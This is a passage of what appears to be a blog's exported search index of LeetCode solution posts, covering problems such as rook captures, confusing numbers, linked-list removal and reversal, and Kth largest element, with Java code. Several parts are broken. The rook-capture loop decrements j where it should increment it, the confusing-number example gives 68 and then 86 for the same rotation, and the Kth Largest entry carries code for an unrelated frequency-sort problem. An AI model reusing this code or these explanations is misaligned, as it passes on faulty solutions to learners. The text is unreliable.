class="number">0</span>) &#123;</span><br><span class="line">        		result.add(<span class="string">"Fizz"</span>);</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        		result.add(<span class="string">"Buzz"</span>);</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		result.add(<span class="string">""</span> + i);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>999. 车的可用捕获量</title>
    <url>/2020/03/26/LeetCode/leetcode-000999-%E8%BD%A6%E7%9A%84%E5%8F%AF%E7%94%A8%E6%8D%95%E8%8E%B7%E9%87%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在一个 8 x 8 的棋盘上，有一个白色车（rook）。也可能有空方块，白色的象（bishop）和黑色的卒（pawn）。它们分别以字符 “R”，“.”，“B” 和 “p” 给出。大写字符表示白棋，小写字符表示黑棋。</p>
<p>车按国际象棋中的规则移动：它选择四个基本方向中的一个（北，东，西和南），然后朝那个方向移动，直到它选择停止、到达棋盘的边缘或移动到同一方格来捕获该方格上颜色相反的卒。另外，车不能与其他友方（白色）象进入同一个方格。</p>
<p>返回车能够在一次移动中捕获到的卒的数量。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/23/1253_example_1_improved.PNG" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;R&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;p&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;]]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">在本例中，车能够捕获所有的卒。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/23/1253_example_2_improved.PNG" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;p&quot;,&quot;p&quot;,&quot;B&quot;,&quot;p&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;p&quot;,&quot;B&quot;,&quot;R&quot;,&quot;B&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;p&quot;,&quot;p&quot;,&quot;B&quot;,&quot;p&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;]]</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">象阻止了车捕获任何卒。</span><br></pre></td></tr></table></figure>

<h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h2><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/23/1253_example_3_improved.PNG" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：[[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"p"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"p"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"p"</span>,<span class="string">"p"</span>,<span class="string">"."</span>,<span class="string">"R"</span>,<span class="string">"."</span>,<span class="string">"p"</span>,<span class="string">"B"</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"B"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"p"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>]]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释： </span><br><span class="line">车可以捕获位置 b5，d6 和 f5 的卒。</span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li>board.length == board[i].length == 8</li>
<li>board[i][j] 可以是 ‘R’，’.’，’B’ 或 ‘p’</li>
<li>只有一个格子上存在 board[i][j] == ‘R’</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历四个方向，累加即可</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numRookCaptures</span><span class="params">(<span class="keyword">char</span>[][] board)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> sy = <span class="number">0</span>;</span><br><span class="line">    	<span class="comment">// 获取车的位置</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j--) &#123;</span><br><span class="line">				<span class="keyword">if</span> (board[i][j] == <span class="string">'R'</span>) &#123;</span><br><span class="line">					sx = i;</span><br><span class="line">					sy = j;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">// 方向数组</span></span><br><span class="line">		<span class="keyword">int</span>[] dx = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">1</span> &#125;;</span><br><span class="line">		<span class="keyword">int</span>[] dy = &#123; <span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> step = <span class="number">0</span>;; ++step) &#123;</span><br><span class="line">				<span class="keyword">int</span> tx = sx + step * dx[i];</span><br><span class="line">				<span class="keyword">int</span> ty = sy + step * dy[i];</span><br><span class="line">				<span class="keyword">if</span> (tx &lt; <span class="number">0</span> || tx &gt;= <span class="number">8</span> || ty &lt; <span class="number">0</span> || ty &gt;= <span class="number">8</span> || board[tx][ty] == <span class="string">'B'</span>) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (board[tx][ty] == <span class="string">'p'</span>) &#123;</span><br><span class="line">					count++;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1056. 易混淆数</title>
    <url>/2020/03/26/LeetCode/leetcode-001056-%E6%98%93%E6%B7%B7%E6%B7%86%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个数字 N，当它满足以下条件的时候返回 true：</p>
<p>原数字旋转 180° 以后可以得到新的数字。</p>
<p>如 0, 1, 6, 8, 9 旋转 180° 以后，得到了新的数字 0, 1, 9, 8, 6 。</p>
<p>2, 3, 4, 5, 7 旋转 180° 后，得到的不是数字。</p>
<p>易混淆数 (confusing number) 在旋转180°以后，可以得到和原来不同的数，且新数字的每一位都是有效的。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><p><img src="https://assets.leetcode.com/uploads/2019/03/23/1268_1.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：6</span><br><span class="line">输出：true</span><br><span class="line">解释： </span><br><span class="line">把 6 旋转 180° 以后得到 9，9 是有效数字且 9!&#x3D;6 。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><p><img src="https://assets.leetcode.com/uploads/2019/03/23/1268_2.png" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="number">89</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释: </span><br><span class="line">把 <span class="number">89</span> 旋转 <span class="number">180</span>° 以后得到 <span class="number">68</span>，<span class="number">86</span> 是有效数字且 <span class="number">86</span>!=<span class="number">89</span> 。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><p><img src="https://assets.leetcode.com/uploads/2019/03/26/1268_3.png" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="number">11</span></span><br><span class="line">输出：<span class="keyword">false</span></span><br><span class="line">解释：</span><br><span class="line">把 <span class="number">11</span> 旋转 <span class="number">180</span>° 以后得到 <span class="number">11</span>，<span class="number">11</span> 是有效数字但是值保持不变，所以 <span class="number">11</span> 不是易混淆数字。</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><p><img src="https://assets.leetcode.com/uploads/2019/03/23/1268_4.png" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="number">25</span></span><br><span class="line">输出：<span class="keyword">false</span></span><br><span class="line">解释：</span><br><span class="line">把 <span class="number">25</span> 旋转 <span class="number">180</span>° 以后得到的不是数字。</span><br></pre></td></tr></table></figure>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><ol>
<li><code>0 &lt;= N &lt;= 10^9</code></li>
<li>可以忽略掉旋转后得到的前导零，例如，如果我们旋转后得到 <code>0008</code> 那么该数字就是 <code>8</code> 。</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>题目要求时整个数字旋转180度。即把68翻转编程86，再把每个位上的数字转换为其单个180度后的数字，即89.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">confusingNumber</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">		Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">		map.put(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		map.put(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">		map.put(<span class="number">6</span>, <span class="number">9</span>);</span><br><span class="line">		map.put(<span class="number">8</span>, <span class="number">8</span>);</span><br><span class="line">		map.put(<span class="number">9</span>, <span class="number">6</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (N &lt; <span class="number">10</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> map.containsKey(N) &amp;&amp; N != map.get(N);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> n = N;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">0</span> != n) &#123;</span><br><span class="line">			<span class="keyword">int</span> t = n % <span class="number">10</span>;</span><br><span class="line">			<span class="keyword">if</span> (!map.containsKey(t)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			result = result * <span class="number">10</span> + map.get(t);</span><br><span class="line">			n /= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ((<span class="keyword">int</span>) result) != N;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>203. Remove Linked List Elements</title>
    <url>/2020/03/25/LeetCode/leetcode-000203-Remove%20Linked%20List%20Elements/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Remove all elements from a linked list of integers that have value <strong>val</strong>.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:  1-&gt;2-&gt;6-&gt;3-&gt;4-&gt;5-&gt;6, val &#x3D; 6</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：递归"><a href="#解法一：递归" class="headerlink" title="解法一：递归"></a>解法一：递归</h3><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == head) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        head.next = removeElements(head.next, val);</span><br><span class="line">        <span class="keyword">return</span> head.val == val ? head.next : head;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：迭代"><a href="#解法二：迭代" class="headerlink" title="解法二：迭代"></a>解法二：迭代</h3><h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == head) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">		ListNode p = head;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != p.next) &#123;</span><br><span class="line">			<span class="keyword">if</span> (p.next.val == val) &#123;</span><br><span class="line">				p.next = p.next.next;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				p = p.next;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> head.val == val ? head.next : head;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>206. Reverse Linked List</title>
    <url>/2020/03/25/LeetCode/leetcode-000206.Reverse%20Linked%20List/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Reverse a singly linked list.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line">Output: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</span><br></pre></td></tr></table></figure>

<h2 id="Follow-up"><a href="#Follow-up" class="headerlink" title="Follow up"></a>Follow up</h2><p>A linked list can be reversed either iteratively or recursively. Could you implement both?</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：递归"><a href="#解法一：递归" class="headerlink" title="解法一：递归"></a>解法一：递归</h3><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> reverse(<span class="keyword">null</span>, head);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> ListNode <span class="title">reverse</span><span class="params">(ListNode next, ListNode current)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == current) &#123;</span><br><span class="line">			<span class="keyword">return</span> next;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		ListNode nextNode = current.next;</span><br><span class="line">		current.next = next;</span><br><span class="line">		<span class="keyword">return</span> reverse(current, nextNode);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：迭代"><a href="#解法二：迭代" class="headerlink" title="解法二：迭代"></a>解法二：迭代</h3><p>借助栈，遍历链表，将每个元素入栈。</p>
<p>再次从头遍历链表，它们的值用栈中的元素覆盖即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        Stack&lt;Integer&gt; values = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        ListNode p = head;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">null</span> != p) &#123;</span><br><span class="line">        	values.add(p.val);</span><br><span class="line">        	p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        p = head;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">null</span> != p) &#123;</span><br><span class="line">        	p.val = values.pop();</span><br><span class="line">        	p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：原地替换"><a href="#解法三：原地替换" class="headerlink" title="解法三：原地替换"></a>解法三：原地替换</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode last = <span class="keyword">null</span>;</span><br><span class="line">        ListNode current = head;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        ListNode next = current.next;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(current != <span class="keyword">null</span>)&#123;</span><br><span class="line">            current.next = last;</span><br><span class="line">            last = current;</span><br><span class="line">            current = next;</span><br><span class="line">            <span class="keyword">if</span>(current != <span class="keyword">null</span>)</span><br><span class="line">                next = current.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>215. Kth Largest Element in an Array</title>
    <url>/2020/03/25/LeetCode/leetcode-000215-Kth%20Largest%20Element%20in%20an%20Array/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Find the <strong>k</strong>th largest element in an unsorted array. Note that it is the kth largest element in the sorted order, not the kth distinct element.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [3,2,1,5,6,4] and k &#x3D; 2</span><br><span class="line">Output: 5</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>] and k = <span class="number">4</span></span><br><span class="line">Output: <span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><ol>
<li>You may assume k is always valid, 1 ≤ k ≤ array’s length.</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>排序，直接返回nums[nums.length - k]</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">char</span> c;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> times;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> times)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.c = c;</span><br><span class="line">			<span class="keyword">this</span>.times = times;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> c;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setC</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.c = c;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTimes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> times;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTimes</span><span class="params">(<span class="keyword">int</span> times)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.times = times;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> String <span class="title">frequencySort</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		 <span class="keyword">int</span>[] chars = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">		 <span class="keyword">for</span> (<span class="keyword">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">			 chars[c]++;</span><br><span class="line">		 &#125;</span><br><span class="line">		 </span><br><span class="line">		 PriorityQueue&lt;Node&gt; charNodes = <span class="keyword">new</span> PriorityQueue&lt;&gt;((a, b) -&gt; b.getTimes() - a.getTimes());</span><br><span class="line">		 <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">256</span>;i++) &#123;</span><br><span class="line">			 <span class="keyword">if</span> (chars[i] == <span class="number">0</span>) &#123;</span><br><span class="line">				 <span class="keyword">continue</span>;</span><br><span class="line">			 &#125;</span><br><span class="line">			 </span><br><span class="line">			 Node node = <span class="keyword">new</span> Node((<span class="keyword">char</span>) i, chars[i]);</span><br><span class="line">			 charNodes.add(node);</span><br><span class="line">		 &#125;</span><br><span class="line">		 </span><br><span class="line">		 StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		 <span class="keyword">while</span> (!charNodes.isEmpty()) &#123;</span><br><span class="line">			 Node node = charNodes.poll();</span><br><span class="line">			 <span class="keyword">int</span> total = node.getTimes();</span><br><span class="line">			 <span class="keyword">while</span> (total &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				 sb.append(node.getC());</span><br><span class="line">				 total--;</span><br><span class="line">			 &#125;</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> sb.toString();</span><br><span class="line">	 &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>237. Delete Node in a Linked List</title>
    <url>/2020/03/25/LeetCode/leetcode-000237-Delete%20Node%20in%20a%20Linked%20List/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Write a function to delete a node (except the tail) in a singly linked list, given only access to that node.</p>
<p>Given linked list – head = [4,5,1,9], which looks like following:</p>
<p><img src="https://assets.leetcode.com/uploads/2018/12/28/237_example.png" alt="img"></p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: head &#x3D; [4,5,1,9], node &#x3D; 5</span><br><span class="line">Output: [4,1,9]</span><br><span class="line">Explanation: You are given the second node with value 5, the linked list should become 4 -&gt; 1 -&gt; 9 after calling your function.</span><br></pre></td></tr></table></figure>

<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: head = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">9</span>], node = <span class="number">1</span></span><br><span class="line">Output: [<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>]</span><br><span class="line">Explanation: You are given the third node with value <span class="number">1</span>, the linked list should become <span class="number">4</span> -&gt; <span class="number">5</span> -&gt; <span class="number">9</span> after calling your function.</span><br></pre></td></tr></table></figure>

<h2 id="Node"><a href="#Node" class="headerlink" title="Node:"></a>Node:</h2><ul>
<li>The linked list will have at least two elements.</li>
<li>All of the nodes’ values will be unique.</li>
<li>The given node will not be the tail and it will always be a valid node of the linked list.</li>
<li>Do not return anything from your function.</li>
</ul>
